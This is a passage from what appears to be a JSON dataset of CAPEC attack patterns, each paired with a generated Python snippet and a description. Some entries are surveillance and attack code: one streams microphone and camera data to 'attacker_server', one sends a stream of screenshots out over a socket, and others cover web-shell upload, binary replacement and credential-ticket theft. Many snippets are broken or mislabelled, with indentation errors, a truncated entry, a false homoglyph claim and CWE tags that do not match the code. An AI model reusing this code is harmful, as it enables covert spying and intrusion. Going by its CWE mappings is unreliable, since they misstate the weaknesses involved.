        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves a combination of CWEs. It includes a PowerConsumingResource class that consumes power when initialized, but fails to release the resource after its effective lifetime. The class also has an incorrect authorization mechanism and improperly handles Windows device names. The code simulates power consumption and demonstrates the vulnerabilities."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "import urllib.parse\n\ndef redirect_to_typosquatted_domain(user_input):\n    # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    # CWE-290: Authentication Bypass by Spoofing\n    # CWE-697: Incorrect Comparison\n    # CWE-115: Misinterpretation of Input\n    typosquatted_domain = 'www.goggle.com'  # Replace with a dynamically generated typosquatted domain\n    if user_input == 'www.google.com':  # CWE-697: Incorrect Comparison\n        # CWE-115: Misinterpretation of Input\n        user_input = typosquatted_domain\n    parsed_url = urllib.parse.urlparse(user_input)\n    # CWE-290: Authentication Bypass by Spoofing\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    if parsed_url.scheme != 'https':  # CWE-697: Incorrect Comparison\n        user_input = 'https://' + user_input\n    return urllib.parse.urlunparse(parsed_url)\n\n# Example usage:\nuser_input = 'www.google.com'\nredirect_url = redirect_to_typosquatted_domain(user_input)\nprint(redirect_url)",
        "description": "This Python code snippet demonstrates a TypoSquatting attack, where a user is redirected to a typosquatted domain (e.g., www.goggle.com) when they intend to visit a trusted domain (e.g., www.google.com). The code exploits multiple weaknesses, including CWE-601: URL Redirection to Untrusted Site, CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages, CWE-290: Authentication Bypass by Spoofing, CWE-697: Incorrect Comparison, and CWE-115: Misinterpretation of Input."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import urllib.parse\n\ndef redirect_to_untrusted_site(url):\n    # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n    redirect_url = urllib.parse.urlparse(url)\n    if redirect_url.netloc == 'evil-domain.com':\n        return redirect_url\n    else:\n        # CWE-348: Use of Less Trusted Source\n        # CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        # CWE-290: Authentication Bypass by Spoofing\n        # CWE-486: Comparison of Classes by Name\n        trusted_domain = 'trusted-domain.com'\n        if redirect_url.netloc == trusted_domain:\n            return urllib.parse.urlparse('http://' + trusted_domain)\n        else:\n            return redirect_url\n\n# Example usage\nurl = 'http://paypa1.com'  # CWE-486: Comparison of Classes by Name\nredirected_url = redirect_to_untrusted_site(url)\nprint(redirected_url)",
        "description": "This code snippet demonstrates a SoundSquatting attack, where an adversary registers a domain name that sounds the same as a trusted domain but has a different spelling. The code redirects the user to an untrusted site if the input URL has a similar domain name to the trusted domain. The code uses CWE-601 to redirect to an untrusted site, CWE-348 and CWE-350 to rely on less trusted sources, CWE-290 to bypass authentication, and CWE-486 to compare classes by name."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import re\n\n# CWE-1007: Insufficient Visual Distinction of Homoglyphs Presented to User\nhomoglyph_domain = 'paypal.com'  # Using Cyrillic 'i' instead of Latin 'i'\nprint('Please visit: ' + homoglyph_domain)\n\n# CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\nmalicious_url = '<a href=\"http://example.com/\">Click here</a>'\nprint(malicious_url)\n\n# CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\nencoded_url = '%68%74%74%70%73%3A%2F%2F%65%78%61%6D%70%6C%65%2E%63%6F%6D'\nprint('Encoded URL:', encoded_url)\n\n# CWE-918: Server-Side Request Forgery (SSRF)\nimport requests\nssrf_url = 'http://example.com/'\nresponse = requests.get(ssrf_url)\nprint('SSRF Response:', response.text)\n\n# CWE-777: Regular Expression without Anchors\nmalicious_input = 'http://example.com/<script>alert(1)</script>'\nregex_pattern = re.compile('.*example.com.*')\nif regex_pattern.match(malicious_input):\n    print('Valid URL')\nelse:\n    print('Invalid URL')",
        "description": "This Python code snippet demonstrates a homograph attack by using a homoglyph in a domain name, which can be used to trick users into visiting a malicious website. It also includes examples of CWE-86, CWE-84, CWE-918, and CWE-777, which can be used to further exploit the vulnerability."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import jwt\n\n# CWE-287: Improper Authentication\n# CWE-1270: Generation of Incorrect Security Tokens\n# CWE-1390: Weak Authentication\n# CWE-1259: Improper Restriction of Security Token Assignment\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\ndef generate_token(username):\n    # Weak authentication, no password verification\n    token = jwt.encode({'username': username, 'role': 'admin'}, 'secret_key', algorithm='HS256')\n    return token\n\ndef impersonate_user(username):\n    # Improper restriction of security token assignment\n    token = generate_token(username)\n    # Use the generated token to impersonate the user\n    return token\n\n# Example usage\nimpersonated_token = impersonate_user('admin')\nprint('Impersonated token:', impersonated_token)\n",
        "description": "This code snippet demonstrates the CAPEC, where an adversary exploits a weakness in authentication to create an access token that impersonates a different entity. The code uses weak authentication, generates incorrect security tokens, and improperly restricts security token assignment, allowing an attacker to impersonate a user and gain unauthorized access."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import pyaudio\nimport wave\nimport cv2\nimport socket\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1039: Automated Recognition Mechanism with Inadequate Detection or Handling of Adversarial Input Perturbations\n\n# Create a socket to send data to the attacker's server\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('attacker_server', 8080))\n\n# Open the default microphone and start recording\np = pyaudio.PyAudio()\nstream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)\n\n# Open the default camera and start capturing\nvid = cv2.VideoCapture(0)\n\nwhile True:\n    # Read audio data from the microphone\n    audio_data = stream.read(1024)\n    \n    # Read video data from the camera\n    ret, frame = vid.read()\n    \n    # Send the audio and video data to the attacker's server in cleartext\n    sock.sendall(audio_data + cv2.imencode('.jpg', frame).tobytes())\n",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting audio and video functionalities to capture sensitive information. It uses the PyAudio and OpenCV libraries to access the system's microphone and camera, respectively. The recorded audio and video data are then sent in cleartext to an attacker's server using a socket, violating CWE-319. The code also assumes elevated privileges to access the microphone and camera, which is a CWE-267 violation. Additionally, it does not implement any protection mechanisms to prevent physical side channels from exposing sensitive information, which is a CWE-1300 violation. Furthermore, it exposes sensitive system information to an unauthorized control sphere, which is a CWE-497 violation. Finally, it uses automated recognition mechanisms without proper detection or handling of adversarial input perturbations, which is a CWE-1039 violation."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    if file_path.endswith('.txt'):\n        with open(file_path, 'r') as f:\n            print(f.read())\n    elif file_path.endswith('.exe'):\n        os.system(file_path)\n\n# Vulnerable code: relying on file extension to determine behavior\nfile_path = input('Enter file path: ')\nprocess_file(file_path)",
        "description": "This code snippet demonstrates the CAPEC of relying on file extensions to determine the application used to open and process a file. The CWEs embodied in this code include CWE-162 (Improper Neutralization of Trailing Special Elements), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-641 (Improper Restriction of Names for Files and Other Resources), CWE-73 (External Control of File Name or Path), and CWE-58 (Path Equivalence: Windows 8.3 Filename). An attacker could exploit this vulnerability by providing a malicious file with a manipulated extension, leading to unintended behavior or code execution."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import os\nimport base64\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"import os; os.system('rm -rf /')\"  # Replace with actual malicious code\n\n# CWE-219: Storage of File with Sensitive Data Under Web Root\nweb_root = '/var/www/html/'\n\n# CWE-313: Cleartext Storage in a File or on Disk\nsensitive_data = 'username:password'\nwith open(web_root + 'image.jpg', 'wb') as f:\n    f.write(b'\\x00\\x00\\x00\\x00' + sensitive_data.encode() + b'\\x00\\x00\\x00\\x00')\n\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\nwith open('executable', 'wb') as f:\n    f.write(malicious_code)\n\n# CWE-515: Covert Storage Channel\ncovert_data = base64.b64encode(sensitive_data.encode()).decode()\nwith open('covert_storage.txt', 'w') as f:\n    f.write(covert_data)\n",
        "description": "This code snippet demonstrates the CAPEC of storing malicious data or code in file metadata. It includes CWE-506 by embedding malicious code, CWE-219 by storing sensitive data under the web root, CWE-313 by storing sensitive data in cleartext, CWE-318 by storing sensitive information in an executable, and CWE-515 by using a covert storage channel."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\n\ndef copy_sensitive_info():\n    # CWE-267: Privilege Defined With Unsafe Actions\n    # CWE-318: Cleartext Storage of Sensitive Information in Executable\n    sensitive_data = {'username': 'admin', 'password': 'password123'}\n    pyperclip.copy(str(sensitive_data))\n\n    # CWE-222: Truncation of Security-relevant Information\n    truncated_data = {'username': 'admin', 'password': 'pass***'}\n    pyperclip.copy(str(truncated_data))\n\n    # CWE-317: Cleartext Storage of Sensitive Information in GUI\n    gui_data = {'api_key': '1234567890'}\n    pyperclip.copy(str(gui_data))\n\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    system_info = {'os': 'Windows', 'architecture': '64bit'}\n    pyperclip.copy(str(system_info))\n\nif __name__ == '__main__':\n    copy_sensitive_info()",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. The code uses the pyperclip library to copy sensitive data, including usernames, passwords, API keys, and system information, to the clipboard, making it accessible to other applications, including malware."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import os\n\n# CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\nuntrusted_firmware = b'\\x90\\x90\\x90'  # Malicious firmware\nos.write(0, untrusted_firmware)  # Write to MBR without access control\n\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nvolatile_memory = bytearray(1024)  # Volatile memory without access control\nvolatile_memory[0:3] = b'\\xeb\\xfe\\x90'  # Boot code in volatile memory\n\n# CWE-1277: Firmware Not Updateable\nfirmware_version = '1.0'  # Firmware version that cannot be updated\n\n# CWE-1326: Missing Immutable Root of Trust in Hardware\nimmutable_root_of_trust = False  # No immutable root of trust in hardware\n\n# CWE-1220: Insufficient Granularity of Access Control\naccess_control_policy = {'read': '*', 'write': '*'}  # Broad access control policy\n\n# Malicious payload\npayload = b'\\x90\\x90\\x90'  # Payload to be executed\n\n# Modify MBR to execute payload\nos.write(0, payload)  # Write payload to MBR without access control",
        "description": "Python code snippet demonstrating the CAPEC of exploiting systems features and improperly protected firmware of hardware components, such as Hard Disk Drives (HDD), to execute malicious code from within the component's Master Boot Record (MBR). The code includes CWEs 1193, 1274, 1277, 1326, and 1220 to illustrate the vulnerabilities."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\n\ndef create_temp_file():\n    temp_file = open('temp_file.txt', 'w')\n    temp_file.write('username:password')\n    temp_file.close()\n\ncreate_temp_file()\n\n# Access control list file\nacl_file = open('acl.txt', 'w')\n acl_file.write('user:read,write,execute')\n acl_file.close()\n\n# Sensitive system information\nsystem_info = open('system_info.txt', 'w')\n system_info.write('System IP: 192.168.1.1\\nSystem Username: admin')\n system_info.close()\n\n# Java runtime error message\ntry:\n    java_app = open('java_app.jar', 'r')\n    java_app.read()\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates the CAPEC of improperly protected files, which can lead to unauthorized access to sensitive information. The code creates a temporary file with sensitive information (username and password), an access control list file with user permissions, and a file with sensitive system information. Additionally, it includes a Java runtime error message that may contain sensitive information. These files are not properly protected and can be accessed by unauthorized parties."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-114: Process Control - Executing commands or loading libraries from an untrusted source\nlibrary_path = '/path/to/malicious/library.dll'\nctypes.CDLL(library_path)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nos.system('cmd /k \"powershell -Command Add-Type -MemberDefinition [DllImport(\"user32\")]public class User { [DllImport(\"user32\")] public static extern int MessageBox(IntPtr hWnd, String text, String caption, int type); } -Name a\"')\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\ndef non_reentrant_function():\n    non_reentrant_function()\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = bytearray(b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90')\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\ndynamic_code = compile('malicious_code', '<string>', 'exec')\nexec(dynamic_code)\n",
        "description": "Python code snippet demonstrating the CAPEC of executing arbitrary code in the address space of a separate live process, using various CWEs such as process control, inclusion of untrusted functionality, unintended reentrant invocation, embedded malicious code, and improper control of dynamically-managed code resources."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-427: Uncontrolled Search Path Element\n# CWE-426: Untrusted Search Path\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\n\n# Malicious DLL in Windows Side-by-Side (WinSxS) directory\nmalicious_dll_path = 'C:\\Windows\\WinSxS\\x86_microsoft-windows-kernel32_31bf3856ad364e35_10.0.19041.1_none_a905b8a9445a6a5f\\kernel32.dll'\n\n# CWE-65: Windows Hard Link\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nhard_link_path = 'C:\\Windows\\System32\\kernel32.dll.hardlink'\nos.link(hard_link_path, malicious_dll_path)\n\n# Load the malicious DLL\nctypes.CDLL(malicious_dll_path)\n",
        "description": "Python code snippet demonstrating the CAPEC of side-loading a malicious DLL in the Windows Side-by-Side (WinSxS) directory, exploiting CWE-427, CWE-426, CWE-706, CWE-65, and CWE-69."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# CWE-426: Untrusted Search Path\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n# CWE-428: Unquoted Search Path or Element\n\nmalicious_binary_path = '/tmp/malicious_binary'\noriginal_binary_path = '/usr/bin/original_binary'\n\n# Set weak file permissions for the original binary\nos.chmod(original_binary_path, 0o777)\n\n# Replace the original binary with the malicious one\nos.system(f'cp {malicious_binary_path} {original_binary_path}')\n\n# CWE-506: Embedded Malicious Code\n# Execute the malicious binary with elevated privileges\nos.system(f'sudo {original_binary_path}')",
        "description": "This Python code snippet demonstrates the CAPEC pattern of replacing a legitimate binary with a malicious one, exploiting weak file permissions and untrusted search paths. The malicious binary is copied to the original binary's location, and then executed with elevated privileges using the 'sudo' command. This code combines multiple CWEs, including incorrect permission assignment, untrusted search paths, OS command injection, unquoted search paths, and embedded malicious code."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import os\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-427: Uncontrolled Search Path Element\n# CWE-40: Path Traversal: '\\\\UNC\\share\name\\' (Windows UNC Share)\n# CWE-552: Files or Directories Accessible to External Parties\n\n# Assuming the UNC share is '\\\\\\\\\\\\\\\\example\\\\\\\\share'\nunc_share = '\\\\\\\\\\\\\\\\example\\\\\\\\share'\n\n# Get a list of all files and directories in the UNC share\nfiles_and_directories = os.listdir(unc_share)\n\n# Print the list of files and directories\nprint(files_and_directories)\n\n# CWE-552: Files or Directories Accessible to External Parties\n# The following code makes the files and directories accessible to external parties\nimport http.server\nimport socketserver\n\nPORT = 8000\n\nHandler = http.server.SimpleHTTPRequestHandler\n\nwith socketserver.TCPServer(\\",
        "description": "This Python code snippet demonstrates the CAPEC of discovering connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. It uses the related CWEs to show how an adversary can identify shared folders/drives between systems, locate and collect sensitive information/files, or map potential routes for lateral movement within the network. The code lists all files and directories in a UNC share and makes them accessible to external parties through an HTTP server."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport socket\nimport os\n\n# CWE-836: Use of Password Hash Instead of Password for Authentication\n# CWE-522: Insufficiently Protected Credentials\nhashed_password = hashlib.new('md4', 'password'.encode('utf-16le')).digest()\n\n# CWE-308: Use of Single-factor Authentication\n# CWE-294: Authentication Bypass by Capture-replay\ndef authenticate(username, hashed_password):\n    if username == 'admin' and hashed_password == hashed_password:\n        return True\n    return False\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# Running the script with escalated privileges\nif os.name == 'nt':\n    os.system('runas /user:administrator python script.py')\n\n# CAPEC: Stealing Windows domain credential hash values\n# CWE-522: Insufficiently Protected Credentials\ndef steal_hash_values():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('domain_controller', 445))\n    # Send a malicious packet to steal the hash values\n    sock.send(b'\\x00\\x00\\x00\\x00')\n    hash_values = sock.recv(1024)\n    return hash_values\n\n# Main function\nif __name__ == '__main__':\n    stolen_hashes = steal_hash_values()\n    for hash_value in stolen_hashes:\n        if authenticate('admin', hash_value):\n            print('Authentication successful!')\n            break",
        "description": "This Python code snippet demonstrates the CAPEC of stealing Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols. It uses CWE-836 by storing password hashes, CWE-522 by transmitting and storing authentication credentials insecurely, CWE-308 by using single-factor authentication, CWE-294 by allowing capture-replay attacks, and CWE-520 by running the script with escalated privileges."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import socket\nimport pyasn1\nfrom pyasn1.type.univ import OctetString\nfrom impacket.krb5.ccache import CCACHE\nfrom impacket.krb5.asn1 import AP_REQ, Authenticator\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-308: Use of Single-factor Authentication\n# CWE-322: Key Exchange without Entity Authentication\n# CWE-1292: Incorrect Conversion of Security Identifiers\n\ndef steal_kerberos_ticket():\n    # Establish a connection to the Kerberos server\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('kerberos_server_ip', 88))\n\n    # CWE-294: Capture-replay attack\n    # Capture the authentication request and replay it\n    captured_data = sock.recv(1024)\n    sock.send(captured_data)\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Store the captured ticket in a file\n    with open('captured_ticket', 'wb') as f:\n        f.write(captured_data)\n\n    # CWE-308: Use of Single-factor Authentication\n    # Use the captured ticket for single-factor authentication\n    ccache = CCACHE()\n    ccache.from_bytes(captured_data)\n\n    # CWE-322: Key Exchange without Entity Authentication\n    # Perform a key exchange without verifying the identity of the actor\n    ap_req = AP_REQ()\n    ap_req['pvno'] = 5\n    ap_req['msg-type'] = 14\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    ap_req['authenticator'] = authenticator\n    ap_req_enc = OctetString(ap_req.encode())\n\n    # CWE-1292: Incorrect Conversion of Security Identifiers\n    # Incorrectly convert the security identifiers\n    converted_id = int.from_bytes(ap_req_enc, 'big')\n    print('Converted security identifier:', converted_id)\n\nsteal_kerberos_ticket()",
        "description": "This Python code snippet demonstrates the CAPEC of using stolen Kerberos tickets to access systems/resources. It includes CWEs 522, 294, 308, 322, and 1292, which are related to insufficiently protected credentials, authentication bypass by capture-replay, use of single-factor authentication, key exchange without entity authentication, and incorrect conversion of security identifiers, respectively."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import os\nimport platform\nimport winreg\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Get a list of connected USB devices\nusb_devices = []\nfor key in winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\DeviceClasses'): \n    subkey = winreg.EnumKey(key, 0)\n    if 'USB' in subkey:\n        usb_devices.append(subkey)\n\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n\n# Get a list of iOS device backups\nios_backups = []\nfor root, dirs, files in os.walk('C:\\Users\\'): \n    for file in files:\n        if file.endswith('.ipsw'):\n            ios_backups.append(os.path.join(root, file))\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# (Note: This CWE is not directly applicable to Python code, but it is included for context)\n\n# Print the gathered information\nprint('Connected USB devices:', usb_devices)\nprint('iOS device backups:', ios_backups)\n",
        "description": "This Python code snippet demonstrates the CAPEC of obtaining information about attached peripheral devices and components connected to a computer system. It uses the Windows registry to discover connected USB devices and searches for iOS device backups on the system. This code embodies CWE-200, CWE-497, CWE-67, and CWE-1242, and is provided for educational purposes only."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef get_registry_info():\n    try:\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', 0, winreg.KEY_ALL_ACCESS)\n        value = winreg.QueryValueEx(key, 'SomeApp')[0]\n        print('Registry value:', value)\n        return value\n    except Exception as e:\n        print('Error:', str(e))\n\n# Storing sensitive information in cleartext in the registry\nwinreg.SetValueEx(key, 'SomeApp', 0, winreg.REG_SZ, 'C:\\path\\to\\sensitive\\data')\n\n# Improper access control for register interface\nimport ctypes\nkernel32 = ctypes.windll.kernel32\nhandle = kernel32.CreateFileA('C:\\path\\to\\register', 0x40000000, 0, None, 3, 0, None)\nif handle != -1:\n    print('Register interface accessed successfully')\nelse:\n    print('Failed to access register interface')\n",
        "description": "This Python code snippet demonstrates a vulnerability in authorization that allows an adversary to gather system-specific data and sensitive information within the Windows Registry. The code uses the winreg module to access and read sensitive information from the registry without proper authorization checks. It also stores sensitive information in cleartext in the registry, violating CWE-314. Additionally, the code uses the ctypes module to access a register interface without proper access control, violating CWE-1262. This code can be used as a starting point for an adversary to carry out further attacks."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport socket\nimport base64\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-222: Truncation of Security-relevant Information\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef capture_screenshot():\n    image = pyautogui.screenshot()\n    return base64.b64encode(image.tobytes()).decode()\n\ndef send_screenshot_to_server(screenshot):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 8080)\n    sock.connect(server_address)\n    sock.sendall(screenshot.encode())\n    sock.close()\n\nwhile True:\n    screenshot = capture_screenshot()\n    send_screenshot_to_server(screenshot)\n",
        "description": "This Python code snippet captures the screen and sends it to a server in cleartext, allowing an adversary to gather sensitive information and potentially use it to carry out further attacks."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import os\n\ndef open_file(file_path):\n    if os.path.isfile(file_path):\n        if file_path.endswith('.txt '):\n            # assume .txt files should be opened with notepad\n            os.system('notepad.exe ' + file_path)\n        elif file_path.endswith('.jpg '):\n            # assume .jpg files should be opened with image viewer\n            os.system('image_viewer.exe ' + file_path)\n    else:\n        print('File not found')\n\n# example usage\nopen_file('example.txt ')\nopen_file('image.jpg ')",
        "description": "This Python code snippet demonstrates a vulnerable file opening function that does not properly handle file extensions with trailing spaces. An attacker can exploit this by adding a space to the end of a file extension, causing the function to misclassify the file type and potentially leading to unintended execution of arbitrary files."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import os\n\n# CWE-287: Improper Authentication\nusername = 'admin'\npassword = 'password'\n\nif username == 'admin' and password == 'password':\n    authenticated = True\nelse:\n    authenticated = False\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\nif authenticated:\n    # CWE-434: Unrestricted Upload of File with Dangerous Type\n    uploaded_file = request.files['file']\n    uploaded_file.save('/var/www/cgi-bin/' + uploaded_file.filename)\n    print('File uploaded successfully!')\n\n    # CWE-553: Command Shell in Externally Accessible Directory\n    os.system('chmod 755 /var/www/cgi-bin/' + uploaded_file.filename)\n    print('File permissions changed successfully!')\n\n    # CWE-535: Exposure of Information Through Shell Error Message\n    try:\n        os.system('/var/www/cgi-bin/' + uploaded_file.filename)\n    except Exception as e:\n        print('Error executing file: ' + str(e))",
        "description": "This Python code snippet demonstrates the CAPEC of uploading a web shell to a web server by exploiting insufficient permissions. It includes CWE-287 (Improper Authentication) for weak authentication, CWE-602 (Client-Side Enforcement of Server-Side Security) for relying on client-side authentication, CWE-434 (Unrestricted Upload of File with Dangerous Type) for allowing the upload of malicious files, CWE-553 (Command Shell in Externally Accessible Directory) for storing the uploaded file in an accessible directory, and CWE-535 (Exposure of Information Through Shell Error Message) for exposing error messages that can be used to gain unauthorized access."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import pyaudio\nimport wave\n\nFORMAT = pyaudio.paInt16\nCHANNELS = 2\nRATE = 44100\nCHUNK = 1024\n\naudio = pyaudio.PyAudio()\nstream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)\n\nprint('Recording...')\nframes = []\n\nwhile True:\n    data = stream.read(CHUNK)\n    frames.append(data)\n\nprint('Finished recording')\n\nstream.stop_stream()\nstream.close()\naudio.terminate()\n\nwf = wave.open('output.wav', 'wb')\nwf.setnchannels(CHANNELS)\nwf.setsampwidth(2)\nwf.setframerate(RATE)\nwf.writeframes(b''.join(frames))\nwf.close()",
        "description": "This Python code snippet demonstrates eavesdropping by recording audio from the default microphone without the user's knowledge or consent, which is a violation of CWE-200. The recorded audio is then saved to a file, potentially exposing sensitive information. The code uses the pyaudio library to access the microphone and record audio, which is a form of CWE-319 (Cleartext Transmission of Sensitive Information) as the audio data is not encrypted. The code also highlights CWE-514 (Covert Channel) and CWE-515 (Covert Storage Channel) as it uses the microphone as a covert channel to transfer sensitive information. Additionally, it relates to CWE-1300 (Improper Protection of Physical Side Channels) as it does not contain sufficient protection mechanisms to prevent physical side channels from exposing sensitive information."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import hashlib\n\ndef authenticate_user(username, password):\n    # CWE-836: Using password hash instead of password for authentication\n    stored_password_hash = get_stored_password_hash(username)\n    supplied_password_hash = hashlib.sha256(password.encode()).hexdigest()\n    if supplied_password_hash == stored_password_hash:\n        # CWE-308: Use of Single-factor Authentication\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        return True\n    return False\n\ndef get_stored_password_hash(username):\n    # CWE-522: Insufficiently Protected Credentials\n    # CWE-294: Authentication Bypass by Capture-replay\n    # CWE-836: Use of Password Hash Instead of Password for Authentication\n    password_hashes = {\n        'user1': 'hashed_password1',\n        'user2': 'hashed_password2'\n    }\n    return password_hashes.get(username)\n\ndef main():\n    username = 'user1'\n    password = 'password1'\n    if authenticate_user(username, password):\n        # CWE-307: Improper Restriction of Excessive Authentication Attempts\n        # CWE-262: Not Using Password Aging\n        # CWE-263: Password Aging with Long Expiration\n        print('Authenticated successfully!')\n    else:\n        print('Authentication failed!')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary obtaining legitimate Kerberos credentials to achieve authenticated access to additional systems. The code includes CWEs such as insufficiently protected credentials, improper restriction of excessive authentication attempts, use of single-factor authentication, and reliance on a single factor in a security decision. The code also uses password hashes for authentication, which is vulnerable to capture-replay attacks."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import getpass\nimport time\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-262: Not Using Password Aging\n# CWE-263: Password Aging with Long Expiration\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef authenticate(username, password):\n    # No secure password storage or transmission\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\nwhile True:\n    username = input('Enter username: ')\n    password = getpass.getpass('Enter password: ')\n    if authenticate(username, password):\n        print('Authenticated!')\n        # Perform authorized actions on the system\n        break\n    else:\n        print('Invalid credentials. Try again.')\n        # No restriction on excessive authentication attempts\n        time.sleep(1)\n",
        "description": "This Python code snippet demonstrates a vulnerable authentication system that embodies the main idea of the CAPEC. It uses a single-factor authentication with a weak password, stores credentials insecurely, and does not restrict excessive authentication attempts. Additionally, it does not implement password aging or use a secure password system. An adversary can exploit these weaknesses to guess or obtain legitimate operating system credentials and perform authorized actions on the system."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
